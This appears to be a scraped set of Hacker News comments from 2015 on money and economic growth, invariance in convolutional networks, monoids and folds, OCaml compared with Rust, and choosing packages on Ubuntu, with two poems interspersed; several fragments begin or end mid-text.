Your example is true only if the economy didn’t grow that year. You could make the opposite example. You have 100 dollars today and 100 dollars tomorrow but the economy shrinks a 6%, what is the real value of your money?<p>A most interesting way would be see money as infrastructure. In order the economy to work you need money. In order to it work properly you need the proper quantity of money.  Of course we can disagree in what is the proper quantity.",1427785084

Likewise for scale invariance.<p>It is a bit silly to call these invariances, as different filter/kernel combinations will be activated when a rotated or scaled input is encountered, the individual filters are not rotation or scale invariant. The entire network can only deal with rotations and scales it encountered during training, whilst having to learn &#x27;redundant features&#x27; to a certain extent.<p>It will get the job done for many tasks, but it&#x27;s a brute force sort of approach that will complicate the learning process (i.e. more scales and rotations require more filters, thus needing a more complex network that is harder to train).<p>I think there&#x27;s definitely a lot that can be learnt from (classical) signal processing in order to come up with a much more elegant and efficient solution.",1427784514

9294705,comment,9292413,9294598,0,0,jfarmer,,,"For a given problem, there&#x27;s often some natural monoidal structure underneath the hood even if the operations aren&#x27;t explicitly part of the type signature.<p>For example, it&#x27;s &quot;natural&quot; for the sum of an empty list to be 0 but the product of an empty list to be 1.  Why?  So that the &quot;hidden homomorphism&quot; is preserved (here ++ is list concatenation):<p><pre><code>        sum(listA ++ listB) == sum(listA) + list(listB)
    product(listA ++ listB) == product(listA) * product(listB)
</code></pre>
For similar reasons, given some predicate P is some predicate, the any? should return false for an empty list and all? should return true so that the following hold:<p><pre><code>    all?(P, listA ++ listB) == all?(P, listA) && all?(P, listB)
    any?(P, listA ++ listB) == any?(P, listA) || any?(P, listB)
</code></pre>
Behind it all we&#x27;re not only transforming values of TypeA into values of TypeB , we&#x27;re doing it in a way that respects some underlying monoidal structure.<p>If you want to think of it in a more programmer-centric way, any time you have an operation that could be as a fold[1] there is an underlying monoidal structure.  Monoids permit folding, folding implies the existence of some monoid.<p>[1]: <a href=""http://en.wikipedia.org/wiki/Fold_(higher-order_function)"" rel=""nofollow"">http://en.wikipedia.org/wiki/Fold_(higher-order_function)</a>",1427784043

    Wild strawberries and cream in the morning.
    Sunlight in every room.

    Some evenings, however, we found ourselves
    Unsure of what comes next.
    Like tragic actors in a theater on fire,
    With birds circling over our heads,
    The dark pines strangely still,
    Each rock we stepped on bloodied by the sunset.

    We were back on our terrace sipping wine.
    Why always this hint of an unhappy ending?
    Clouds of almost human appearance
    Gathering on the horizon, but the rest lovely
    With the air so mild and the sea untroubled.

    The night suddenly upon us, a starless night.
    You lighting a candle, carrying it naked
    Into our bedroom and blowing it out quickly.
    The dark pines and grasses strangely still.

Japan by Billy Collins<p><pre><code>    Today I pass the time reading
    a favorite haiku,
    saying the few words over and over.

    It feels like eating
    the same small, perfect grape
    again and again.

    I walk through the house reciting it
    and leave its letters falling
    through the air of every room.

    I stand by the big silence of the piano and say it.
    I say it in front of a painting of the sea.
    I tap out its rhythm on an empty shelf.

    I listen to myself saying it,
    then I say it without listening,
    then I hear it without saying it.

    And when the dog looks up at me,
    I kneel down on the floor
    and whisper it into each of his long white ears.

    It&#x27;s the one about the one-ton temple bell
    with the moth sleeping on its surface,

    and every time I say it, I feel the excruciating
    pressure of the moth
    on the surface of the iron bell.

    When I say it at the window,
    the bell is the world
    and I am the moth resting there.

    When I say it at the mirror,
    I am the heavy bell
    and the moth is life with its papery wings.

    And later, when I say it to you in the dark,
    you are the bell,
    and I am the tongue of the bell, ringing you,

    and the moth has flown
    from its line
    and moves like a hinge in the air above our bed.</code></pre>",1427782757

Do you think a company of 4 being acquired would be able to as dramatically affect a company of 200 engineers? How about 2000?

Please don&#x27;t flame me for the excessive rant below and keep in mind these are subjective reasons (that may be badly worded, (it is 2am) or even worse simply misinformed).<p>- The compiler error messages are awful, especially for newer programmers. By awful I really do mean awful. &quot;Syntax error&quot; is not a very meaningful message, but at least it tells you the location right? Except due to the poor grammar of the language (I did say these objections are subjective) a small mistake like a missing in or semi-colon results in a wild chase trying to figure why you are getting a &quot;syntax error&quot; in a perfectly valid piece of code.<p>- Unpolished language grammar. There are just a lot of small things that bug me about the language like the existence of &quot;in&quot; for let statements (Rust&#x27;s approach feels much cleaner), having multiple ways to create blocks (begin..end, and parenthesis), having to type rec for recursive functions, difference between declaration of functions in mli and ml, argument sigs and function sigs use the same delimeter, let is used for binding functions, imperative mode using refs is just plain ugly. These are minor and almost entirely subjective objections, but the real issue isn&#x27;t just a lack of polish, it&#x27;s that the language is too unrestricted.<p>- Language is too unrestricted. 1) It&#x27;s often very difficult to read other people&#x27;s code because there are many ways to accomplish the same thing. 2) The language almost invites you to have high levels of nested logic (something considered a cardinal sin in imperative programming) to the extent that it&#x27;s not uncommon to see (or be tempted to write) 6 or even more levels of depth. 3) Easy abuse of lambda functions (fun and function) can make it difficult to even know how many parameters a function really expects. I mean this in the sense that you need to carefully read the code to get an idea of even whether a let binding is a data binding or a function binding. Of course these are all things you learn to handle and manage with some experience, but they really don&#x27;t make the language an easy pick-up.<p>- Language is difficult to reason about internally. Let me give an example. OCaml can be very clever sometimes, like when you prepend to a list, that&#x27;s an O(1) prepend with no copy of the initial list even though it&#x27;s immutable. To write better OCaml code you need to become familiar with such things (though I suppose that&#x27;s true of any language) and sometimes it&#x27;s not easy (for me at least) to guess internal behavior. For example, does &quot;let t = {t with x} in&quot; modify t in place even though t is immutable (assuming we are the same level where t is first declared, i.e. initial t is no longer reachable) or does it create a new copy of t and then modify the x in that new copy? I guess a fair counter is, who cares?, and I get that, but at the same time I have some underlying drive that makes me want to know (the answer is the second one, the data is copied) at least things such as when I am allocating new memory.<p>The last big one and the most controversial of all - (purely) functional programming is not worth the trouble. It is inherently more complicated than imperative regardless of all the functional people claiming otherwise. It&#x27;s not as simple as &quot;you learned one first and that&#x27;s why it&#x27;s easier&quot;, an argument I&#x27;ve heard repeated many times, one that probably has merit, but also one that cannot account for the difference in difficulty. I can write an entire paper on why functional is more difficult (essentially it will use most of the reasoning as Out of the Tar Pit - which argues that functional is great - but with some changes in the argument to result in an opposing conclusion). In terms of informal reasoning, the benefits of lack of internal (to a function) mutable state are essentially zero, or better worded, lack of local mutable state increases the complexity of a function. It&#x27;s not like your state doesn&#x27;t change if you use recursion and immutability... it certainly does, it just mutates transiently while you are building up your result. That&#x27;s often more difficult to reason about than a typical imperative solution with mutability. Okay, fine, perhaps I am a shit developer who simple isn&#x27;t smart enough or lacks the experience, but the reality is when you are working on a team, the chances are that you will have a very difficult time gathering 20, 30, or more solid functional developers let alone that many OCaml developers. Ideally, you want your team to all be at least competent in the language you are using and that&#x27;s harder to achieve with OCaml.<p>I think OCaml is a lovely language that brings a lot to the table, but I simply can&#x27;t see it becoming mainstream (or really any other functional language either). The thing that makes sense to me is to merge imperative and functional into some sort of hybrid language, which is one of the main reasons Rust is so exciting. Reduce global mutable state to as low as reasonable while making allowances for local mutable state. Also Rust fixes the three sections of complaints above - great errors and warnings, feels more polished when writing, and forces a much higher rigidity - though it introduces some other issues.<p>At this point I am not even sure what I&#x27;m talking about so I&#x27;ll end it here hoping the above made any sense at all.",1427782524

We run Ubuntu, which might be our mistake, but off the top of my head, I think our installations of nginx[1], Python[2], pip[3], rust[4], mongo, consul[4], openldap[1], gcc[3] and several other things fail your criteria. Not all are on the same server, I suppose, but there&#x27;s definitely overlap. Most of these are simply because the version in Ubuntu is unacceptably out of date, some are because there are bugs in the provided version, some just flat aren&#x27;t available, and some are re-compiled with additions. (Like, non-default USE flags, if you&#x27;re a Gentoo user; Ubuntu lacks the concept.)<p>I think the issue I have with rules like yours, and that proposed in the article, is that they&#x27;re fine when you&#x27;re working with no information, but when an engineer lays out a need, shows how the &quot;boring&quot; package available does not fit that need, and then proceeds to choose an &quot;interesting&quot; package that meets the requirements of the problem, the last thing he wants is nebulous objections over how the choice is an &quot;interesting&quot; tech. For example, the article calls out consul (we also considered etcd and Zookeeper…) as an &quot;interesting&quot; choice, but need a multi-node distributed database with a <i>good</i> consensus algorithm for things such as service discovery and locking; what other techs fit the bill that aren&#x27;t &quot;interesting&quot;?. Consul fits the bill. It&#x27;s HTTP- and DNS-interfaces interest me because they play well with our existing <i>boring</i> tools, like http (or curl) and dig…<p>IIRC,
